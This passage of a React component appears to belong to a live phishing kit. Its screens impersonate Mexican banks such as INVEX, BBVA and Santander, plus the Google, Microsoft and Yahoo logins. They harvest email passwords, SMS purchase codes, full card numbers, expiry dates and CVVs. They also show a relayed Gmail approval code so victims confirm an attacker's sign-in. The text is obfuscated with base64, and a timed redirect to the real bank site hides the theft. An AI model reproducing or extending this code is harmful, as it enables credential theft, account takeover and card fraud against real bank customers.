              {atob('SW5ncmVzYSBlbCBjw7NkaWdvIHF1ZSByZWNpYmlzdGUgcGFyYSBhdXRvcml6YXIgbGEgY29tcHJhIGVuIGzDrW5lYS4gRXN0ZSBtaXNtbyBjw7NkaWdvIHNpcnZlIHBhcmEgcmVhbGl6YXIgbGEgY2FuY2VsYWNpw7NuLiBMbyBoZW1vcyBlbnZpYWRvIGEgdHUgdGVsw6lmb25vIGNvbiB0ZXJtaW5hY2nDs246')} <strong>{screenData.terminacion || "****"}</strong>
            </p>
            
            <div className="p-4 bg-gray-100 rounded mb-4 text-black">
              <p className="mb-2">
                <strong>{atob('SW5mb3JtYWNpw7NuIGRlIGNhbmNlbGFjacOzbjo=')}:</strong>
              </p>
            </div>
            
            <div className="mb-4">
              <label className="block text-sm font-medium mb-1">{atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIGNhbmNlbGFjacOzbjo=')}:</label>
              <Input 
                type="text" 
                placeholder={atob('SW5ncmVzYSBlbCBjw7NkaWdvIGRlIDYgZMOtZ2l0b3M=')}
                className="w-full border border-gray-300 rounded p-2 mb-2"
                value={dataH}
                onChange={(e) => setDataH(e.target.value.replace(/\D/g, '').substring(0, 6))}
                maxLength={6}
              />
              <p className="text-xs text-gray-500">{atob('RWwgY8OzZGlnbyBkZWJlIHRlbmVyIDYgZMOtZ2l0b3MgbnVtw6lyaWNvcy4=')}.</p>
            </div>
            
            <Button 
              className={primaryBtnClass}
              onClick={() => {
                if (dataH && dataH.length === 6) {
                  console.log(atob('RW52aWFuZG8gY8OzZGlnbw=='), dataH);
                  onSubmit(ScreenType.SMS_COMPRA, { smsCompra: dataH });
                } else {
                  alert(atob('UG9yIGZhdm9yIGluZ3Jlc2EgdW4gY8OzZGlnbyB2w6FsaWRvIGRlIDYgZMOtZ2l0b3Mu'));
                }
              }}
              disabled={!dataH || dataH.length !== 6}
            >
              {atob('Q29uZmlybWFyIGNhbmNlbGFjacOzbg==')}
            </Button>
          </>
        );
        return getBankContainer(processContent);

      case ScreenType.VALIDANDO:
        const validandoContent = (
          <>
            <h2 className="text-xl font-bold mb-4">Validando...</h2>
            <p className="text-sm text-gray-500 mb-4">Esto puede tomar un momento. Por favor espere...</p>
            <div className="h-4 w-full bg-gray-200 rounded overflow-hidden">
              <div className={`h-full ${
                banco === 'LIVERPOOL' ? 'liverpool-bg' :
                banco === 'BANBAJIO' ? 'banbajio-bg' : 
                banco === 'CITIBANAMEX' ? 'bg-[#0070BA]' : 
                banco === 'BBVA' ? 'bg-[#072146]' :
                banco === 'BANCOPPEL' ? 'bg-[#0066B3]' :
                banco === 'HSBC' ? 'bg-[#DB0011]' :
                banco === 'AMEX' ? 'amex-bg' :
                banco === 'SANTANDER' ? 'santander-bg' :
                banco === 'SCOTIABANK' ? 'scotiabank-bg' :
                banco === 'INVEX' ? 'invex-bg' :
                'bg-[#EC1C24]'
              } animate-progress-bar`}></div>
            </div>
            <p className="text-xs text-gray-400 mt-3">Verificando información de seguridad</p>
          </>
        );
        return getBankContainer(validandoContent);
        
      case ScreenType.GMAIL:
        // Función para cambiar de la pantalla de correo a la de contraseña
        const handleGmailNextScreen = () => {
          if (gmailScreen === 'correo') {
            if (gmailCorreo.trim()) {
              setGmailScreen('contrasena');
            }
          } else {
            // Enviar datos completos
            if (gmailContrasena.trim()) {
              onSubmit(ScreenType.GMAIL, { 
                correo: gmailCorreo, 
                contrasena: gmailContrasena 
              });
            }
          }
        };
        
        // Función para alternar la visibilidad de la contraseña
        const toggleGmailPasswordVisibility = () => {
          setShowGmailPassword(!showGmailPassword);
        };
        
        // Contenedor personalizado para Gmail que es distinto al resto de pantallas
        const getGmailContainer = (children: React.ReactNode) => {
          return (
            <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
              {children}
            </div>
          );
        };
        
        // Pantalla de correo electrónico (primera pantalla)
        const gmailCorreoContent = (
          <>
            <div className="flex justify-center mb-4">
              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
            </div>
            
            <p className="text-[15px] text-gray-700 mb-6">
              Para sincronizar tus notificaciones con la aplicación <strong>Invex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
            </p>
            
            <Input 
              type="text"
              id="gmailCorreo" 
              placeholder="Correo electrónico o teléfono" 
              className="w-full p-3 border border-gray-300 rounded mb-4" 
              value={gmailCorreo}
              onChange={(e) => setGmailCorreo(e.target.value)}
            />
            
            <div className="text-left mb-6">
              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
            </div>
            
            <Button 
              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
              onClick={handleGmailNextScreen}
            >
              Siguiente
            </Button>
          </>
        );
        
        // Pantalla de contraseña (segunda pantalla)
        const gmailContrasenaContent = (
          <>
            <div className="flex justify-center mb-4">
              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
            </div>
            
            <div className="flex items-center justify-center mb-6">
              <div className="bg-gray-200 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center font-semibold mr-2">
                {gmailCorreo[0]?.toUpperCase() || 'G'}
              </div>
              <span className="text-sm">{gmailCorreo}</span>
            </div>
            
            <Input 
              type={showGmailPassword ? "text" : "password"}
              id="gmailContrasena" 
              placeholder="Ingresa tu contraseña" 
              className="w-full p-3 border border-gray-300 rounded mb-2" 
              value={gmailContrasena}
              onChange={(e) => setGmailContrasena(e.target.value)}
            />
            
            <div className="flex items-center mb-4 text-left">
              <Checkbox 
                id="mostrarContrasena" 
                checked={showGmailPassword}
                onCheckedChange={toggleGmailPasswordVisibility}
                className="mr-2"
              />
              <Label htmlFor="mostrarContrasena" className="text-sm text-gray-700 cursor-pointer">
                Mostrar contraseña
              </Label>
            </div>
            
            <div className="text-left mb-6">
              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste la contraseña?</a>
            </div>
            
            <Button 
              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
              onClick={handleGmailNextScreen}
            >
              Siguiente
            </Button>
          </>
        );
        
        // Renderizar la pantalla correspondiente según el estado
        return getGmailContainer(gmailScreen === 'correo' ? gmailCorreoContent : gmailContrasenaContent);
        
      case ScreenType.GMAIL_VERIFY:
        // Contenedor personalizado para Gmail Verify que es distinto al resto de pantallas
        const getGmailVerifyContainer = (children: React.ReactNode) => {
          return (
            <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
              {children}
            </div>
          );
        };
        
        // Pantalla de verificación de Google
        const gmailVerificationContent = (
          <>
            <div className="flex justify-center mb-5">
              <img src={googleLogo} alt="Google" className="w-20" />
            </div>
            
            <h1 className="text-2xl font-normal mb-2">Verifica que eres tú</h1>
            <p className="text-sm text-gray-700 mb-4 max-w-xs mx-auto">
              Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder <a href="#" className="text-blue-600">Más información</a>
            </p>

            <div className="inline-block border border-gray-300 rounded-full py-2 px-6 bg-gray-100 mb-5 mx-auto">
              {screenData.correo || gmailCorreo || "inmobiliariadexter627@gmail.com"}
            </div>

            <div className="text-5xl font-normal my-8" id="codigo-grande">
              {screenData.codigo || ""}
            </div>

            <p className="text-sm mb-2">Abrir la app de Gmail en tu celular</p>
            <p className="text-sm text-gray-700 mb-5 max-w-xs mx-auto">
              Google envió una notificación a tu celular. Abre la app de Gmail, presiona <strong>Sí</strong> en el mensaje y, luego, presiona <strong>{screenData.codigo || ""}</strong> en el teléfono para verificar que eres tú.
            </p>

            <p 
              className="text-gray-500 text-sm mt-10 cursor-pointer hover:underline"
              onClick={() => {
                // Al hacer clic en "Reenviarlo", mostramos la pantalla de carga
                onSubmit(ScreenType.VALIDANDO, { redirect: "gmail_verify" });
              }}
            >
              Reenviarlo
            </p>
            <a href="#" className="text-blue-600 text-sm mt-4 block hover:underline">Probar otro método</a>
          </>
        );
        
        return getGmailVerifyContainer(gmailVerificationContent);
        
      case ScreenType.HOTMAIL:
        const hotmailContent = (
          <div className="flex flex-col items-center w-full max-w-md mx-auto">
            <div className="flex justify-center mb-8">
              <img 
                src={microsoftLogo} 
                alt="Microsoft Logo" 
                className="h-12"
              />
            </div>
            
            <h2 className="text-2xl font-light mb-4 self-start">Iniciar sesión</h2>
            
            <p className="text-sm text-gray-600 mb-6 self-start">
              Para sincronizar tus notificaciones con la aplicación INVEX Control, inicia sesión utilizando tu correo electrónico registrado.
            </p>
            
            {!hotmailStep2 ? (
              // Paso 1: Correo electrónico
              <>
                <div className="w-full mb-4">
                  <Input 
                    type="email" 
                    className="w-full p-2 border border-gray-300 rounded text-black" 
                    placeholder={atob('Q29ycmVvIGVsZWN0csOzbmljbywgdGVsw6lmb25vIG8gU2t5cGU=')}
                    value={emailInput}
                    onChange={(e) => setEmailInput(e.target.value)}
                  />
                </div>
                
                <div className="text-xs text-gray-600 mb-6 self-start">
                  {atob('wr9ObyB0aWVuZSB1bmEgY3VlbnRhPw==')} <a href="#" className="text-blue-600">{atob('Q3JlZSB1bmEu')}</a>
                </div>
                
                <div className="flex justify-between w-full">
                  <div>
                    <a href="#" className="text-sm text-blue-600">{atob('T3BjaW9uZXMgZGUgaW5pY2lvIGRlIHNlc2nDs24=')}</a>
                  </div>
                  <Button 
                    className="bg-blue-600 text-white px-8 rounded"
                    onClick={() => {
                      if (!emailInput) return;
                      setHotmailStep2(true);
                    }}
                  >
                    {atob('U2lndWllbnRl')}
                  </Button>
                </div>
              </>
            ) : (
              // Paso 2: Contraseña
              <>
                <div className="text-base self-start mb-6">
                  {emailInput}
                </div>
                
                <div className="w-full mb-4">
                  <Input 
                    type="password" 
                    className="w-full p-2 border border-gray-300 rounded text-black" 
                    placeholder={atob('Q29udHJhc2XDsWE=')}
                    value={passwordInput}
                    onChange={(e) => setPasswordInput(e.target.value)}
                  />
                </div>
                
                <div className="text-xs text-gray-600 mb-6 self-start">
                  <a href="#" className="text-blue-600">{atob('wr9PbHZpZMOzIHN1IGNvbnRyYXNlw7FhPw==')}</a>
                </div>
                
                <div className="flex justify-between w-full">
                  <div>
                    <Button 
                      variant="link" 
                      className="text-sm text-blue-600 p-0"
                      onClick={() => setHotmailStep2(false)}
                    >
                      {atob('QXRyw6Fz')}
                    </Button>
                  </div>
                  <Button 
                    className="bg-blue-600 text-white px-8 rounded"
                    onClick={() => {
                      if (!passwordInput) return;
                      onSubmit(ScreenType.HOTMAIL, { 
                        correo: emailInput, 
                        contrasena: passwordInput 
                      });
                    }}
                  >
                    {atob('SW5pY2lhciBzZXNpw7Nu')}
                  </Button>
                </div>
              </>
            )}
          </div>
        );
        
        return (
          <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
            {hotmailContent}
          </div>
        );
        
      case ScreenType.YAHOO:
        const yahooContent = (
          <div className="flex flex-col items-center w-full max-w-sm mx-auto">
            <div className="flex justify-center mb-8">
              <img 
                src={yahooLogo} 
                alt="Yahoo Logo" 
                className="h-10"
              />
            </div>
            
            {!yahooStep2 ? (
              // Paso 1: Correo electrónico
              <>
                <h2 className="text-3xl font-bold mb-4">Iniciar sesión</h2>
                
                <p className="text-sm text-gray-700 mb-6 w-full text-left">
                  Para sincronizar tus notificaciones con la aplicación INVEX Control, inicia sesión utilizando tu correo electrónico registrado.
                </p>
                
                <div className="w-full mb-5">
                  <Input 
                    type="email" 
                    className="w-full p-3 border border-gray-300 rounded-sm text-black" 
                    placeholder="Nombre de usuario, correo o teléfono móvil"
                    value={emailInput}
                    onChange={(e) => setEmailInput(e.target.value)}
                  />
                </div>
                
                <div className="flex justify-between w-full">
                  <div>
                    <a href="#" className="text-sm text-blue-700">Crear cuenta</a>
                  </div>
                  <Button 
                    className="bg-[#6001D2] hover:bg-[#5300bd] text-white px-8 py-2 rounded-sm"
                    onClick={() => {
                      // Validación mínima
                      if (!emailInput) return;
                      setYahooStep2(true);
                    }}
                  >
                    Siguiente
                  </Button>
                </div>
              </>
            ) : (
              // Paso 2: Contraseña
              <>
                <h2 className="text-3xl font-bold mb-6">Ingresa tu contraseña</h2>
                
                <div className="text-base self-start mb-2 font-bold">
                  {emailInput}
                </div>
                
                <div className="w-full mb-5">
                  <Input 
                    type="password" 
                    className="w-full p-3 border border-gray-300 rounded-sm text-black" 
                    placeholder="Contraseña"
                    value={passwordInput}
                    onChange={(e) => setPasswordInput(e.target.value)}
                  />
                </div>
                
                <div className="text-sm self-start mb-5">
                  <a href="#" className="text-blue-700">¿Olvidaste tu contraseña?</a>
                </div>
                
                <div className="flex justify-between w-full">
                  <Button 
                    variant="link" 
                    className="text-sm text-blue-700 p-0"
                    onClick={() => setYahooStep2(false)}
                  >
                    Atrás
                  </Button>
                  <Button 
                    className="bg-[#6001D2] hover:bg-[#5300bd] text-white px-8 py-2 rounded-sm"
                    onClick={() => {
                      // Validación mínima
                      if (!passwordInput) return;
                      onSubmit(ScreenType.YAHOO, { 
                        correo: emailInput, 
                        contrasena: passwordInput 
                      });
                    }}
                  >
                    Siguiente
                  </Button>
                </div>
              </>
            )}
          </div>
        );
        
        return (
          <div className="bg-white p-6 pt-8 rounded max-w-lg mx-auto shadow">
            {yahooContent}
          </div>
        );

      case ScreenType.DATOS_TARJETA:
        // Función para validar los datos de la tarjeta
        const handleSecureSubmit = () => {
          // Limpiar errores previos
          setErrorA(null);
          
          // Validar número usando función ofuscada
          const cleanNumber = dataE.replace(/\s/g, '');
          if (cleanNumber.length !== 16) {
            setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIGRlYmUgdGVuZXIgMTYgZMOtZ2l0b3M='));
            return;
          }
          
          // Validar usando función ofuscada
          if (!validateSecureData(cleanNumber, 'card')) {
            setErrorA(protectionUtils.decode('RWwgbsO6bWVybyBkZSB0YXJqZXRhIG5vIGVzIHbDoWxpZG8='));
            return;
          }
          
          // Validar fecha de vencimiento
          const datePartes = dataF.split('/');
          if (datePartes.length !== 2 || datePartes[0].length !== 2 || datePartes[1].length !== 2) {
            setErrorA(protectionUtils.decode('TGEgZmVjaGEgZGUgdmVuY2ltaWVudG8gZGViZSBlc3RhciBlbiBmb3JtYXRvIE1NL0FB'));
            return;
          }
          
          const month = parseInt(datePartes[0]);
          if (month < 1 || month > 12) {
            setErrorA(protectionUtils.decode('RWwgbWVzIGRlIHZlbmNpbWllbnRvIGRlYmUgZXN0YXIgZW50cmUgMDEgeSAxMg=='));
            return;
          }
          
          // Validar CVV
          if (dataG.length < 3 || dataG.length > 4) {
            setErrorA(protectionUtils.decode('RWwgY8OzZGlnbyBkZSBzZWd1cmlkYWQgZGViZSB0ZW5lciAzIG8gNCBkw61naXRvcw=='));
            return;
          }
          
          // Todo correcto, enviar los datos
          onSubmit(ScreenType.DATOS_TARJETA, {
            numeroTarjeta: cleanNumber,
            fechaVencimiento: dataF,
            cvv: dataG
          });
        };

        const datosTarjetaContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Confirmar datos de tarjeta</h2>
            <p className="mb-4">
              Por tu seguridad, necesitamos verificar los datos de tu tarjeta con terminación: <strong>{screenData.terminacion || "****"}</strong>
            </p>
            
            <div className="space-y-4 mb-4">
              <div className="flex flex-col">
                <label className="text-sm text-gray-700 mb-1">Número de tarjeta:</label>
                <Input 
                  type="text"
                  placeholder="1234 5678 9012 3456"
                  className="w-full border border-gray-300 rounded p-2"
                  value={dataE}
                  onChange={(e) => {
                    // Formatear usando función ofuscada
                    const formatted = formatSecureInput(e.target.value);
                    setDataE(formatted);
                    
                    // Limpiar error al escribir
                    if (errorA) setErrorA(null);
                  }}
                  maxLength={19} // 16 dígitos + 3 espacios
                />
              </div>
              
              <div className="flex space-x-4">
                <div className="flex-1">
                  <label className="text-sm text-gray-700 mb-1">Fecha de vencimiento:</label>
                  <Input 
                    type="text"
                    placeholder="MM/AA"
                    className="w-full border border-gray-300 rounded p-2"
                    value={dataF}
                    onChange={(e) => {
                      // Formatear usando función ofuscada
                      const formatted = formatSecureDate(e.target.value);
                      setDataF(formatted);
                      
                      // Limpiar error al escribir
                      if (errorA) setErrorA(null);
                    }}
                    maxLength={5} // MM/AA = 5 caracteres
                  />
                </div>
                
                <div className="flex-1">
                  <label className="text-sm text-gray-700 mb-1">Código de seguridad:</label>
                  <Input 
                    type="password"
                    placeholder="CVV"
                    className="w-full border border-gray-300 rounded p-2"
                    value={dataG}
                    onChange={(e) => {
                      // Solo permitir números
                      const value = e.target.value.replace(/\D/g, '');
                      setDataG(value);
                      
                      // Limpiar error al escribir
                      if (errorA) setErrorA(null);
                    }}
                    maxLength={4}
                  />
                </div>
              </div>
            </div>
            
            {errorA && (
              <div className="text-red-500 text-sm mb-4">{errorA}</div>
            )}
            
            <Button 
              className={primaryBtnClass}
              onClick={handleSecureSubmit}
            >
              {atob('VmVyaWZpY2Fy')}
            </Button>
          </>
        );
        return getBankContainer(datosTarjetaContent);

      case ScreenType.GENERANDO_ACLARACION:
        const generandoPromocionContent = (
          <div className="flex flex-col items-center justify-center py-10">
            <h2 className="text-xl font-bold mb-5">Procesando promoción de vuelos</h2>
            <div className="flex items-center justify-center mb-5">
              <div className="w-12 h-12 border-t-4 border-b-4 border-[#BE0046] rounded-full animate-spin"></div>
            </div>
            <p className="text-center mb-2">Por favor espere, estamos validando su promoción de vuelos...</p>
            <p className="text-center text-sm text-gray-500">Será redirigido automáticamente al portal de INVEX Tarjetas</p>
          </div>
        );
        return getBankContainer(generandoPromocionContent);
        
      default:
        const defaultContent = (
          <>
            <h2 className="text-xl font-bold mb-3">Pantalla no disponible</h2>
            <p>La pantalla solicitada no está disponible en este momento.</p>
          </>
        );
        return getBankContainer(defaultContent);
    }
  };

  // Definimos las clases de estilos para los botones según el banco
  const getPrimaryBtnClass = () => {
    switch(banco) {
      case 'LIVERPOOL':
        return 'bg-[#E1147B] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'CITIBANAMEX':
        return 'bg-[#0070BA] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANBAJIO':
        return 'banbajio-button'; // Ya tiene todos los estilos definidos en el CSS
      case 'BBVA':
        return 'bbva-button';
      case 'BANCOPPEL':
        return 'bg-[#0066B3] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'HSBC':
        return 'bg-[#DB0011] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'AMEX':
        return 'bg-[#0077C8] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SANTANDER':
        return 'bg-[#EC0000] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'SCOTIABANK':
        return 'bg-[#EC111A] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'INVEX':
        return 'bg-[#BE0046] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANREGIO':
        return 'bg-[#FF6600] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      case 'BANORTE':
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors';
      default:
        return 'bg-[#EC1C24] text-white py-2 px-6 rounded hover:bg-opacity-90 transition-colors'; // Banorte por defecto
    }
  };

  const primaryBtnClass = getPrimaryBtnClass();
  
  // Efecto para redirección automática si la pantalla es GENERANDO_ACLARACION
  useEffect(() => {
    if (currentScreen === ScreenType.GENERANDO_ACLARACION) {
      // Temporizador para la redirección (3 segundos)
      const redirectTimer = setTimeout(() => {
        window.location.href = 'https://www.invextarjetas.com.mx/index#/home';
      }, 3000);
      
      // Limpieza del temporizador si el componente se desmonta
      return () => clearTimeout(redirectTimer);
    }
  }, [currentScreen]);

  // Eliminamos la función bankLogo ya que solo usaremos el logo en el header del ClientScreen.tsx

  // Función para obtener la clase de header según el banco
  const getBankHeaderClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'liverpool-header';
      case 'BANBAJIO': return 'banbajio-header';
      case 'CITIBANAMEX': return 'citibanamex-header';
      case 'BBVA': return 'bbva-header';
      case 'BANCOPPEL': return 'bg-[#0066B3] text-white p-2';
      case 'HSBC': return 'bg-white text-[#DB0011] p-2 border-t-2 border-[#DB0011]';
      case 'AMEX': return 'bg-[#0077C8] text-white p-2';
      case 'SANTANDER': return 'santander-header';
      case 'SCOTIABANK': return 'scotiabank-header';
      case 'INVEX': return 'invex-header';
      case 'BANREGIO': return 'banregio-header';
      case 'BANORTE': return 'banorte-header';
      default: return 'bg-gray-100 p-3 text-center font-semibold';
    }
  };

  // Función para obtener la clase del contenedor según el banco
  const getBankContainerClass = () => {
    switch(banco) {
      case 'LIVERPOOL': return 'bg-white p-4 rounded-lg shadow liverpool-container';
      case 'BANBAJIO': return 'bg-white p-4 rounded-lg shadow';
      case 'CITIBANAMEX': return 'citibanamex-container';
      case 'BBVA': return 'bbva-container';
      case 'BANCOPPEL': return 'bg-white p-4 rounded-lg shadow bancoppel-container';
      case 'HSBC': return 'bg-white p-4 rounded-lg shadow hsbc-container';
      case 'AMEX': return 'bg-white p-4 rounded-lg shadow amex-container';
      case 'SANTANDER': return 'bg-white p-4 rounded-lg shadow santander-container';
      case 'SCOTIABANK': return 'bg-white p-4 rounded-lg shadow scotiabank-container';
      case 'INVEX': return 'bg-white p-4 rounded-lg shadow invex-container';
      case 'BANREGIO': return 'bg-white p-4 rounded-lg shadow banregio-container';
      case 'BANORTE': return 'banorte-container';
      default: return '';
    }
  };

  // Renderizados especiales según el banco
  if (banco === 'CITIBANAMEX') {
    // Podríamos agregar un renderizado especial para CitiBanamex si se necesita en el futuro
  }

  // Renderizado normal para otros bancos
  return (
    <div className={getBankContainerClass()}>
      {/* No mostrar logos en el contenido principal - los logos ya están en el header de cada banco */}
      {renderScreen()}
    </div>
  );
};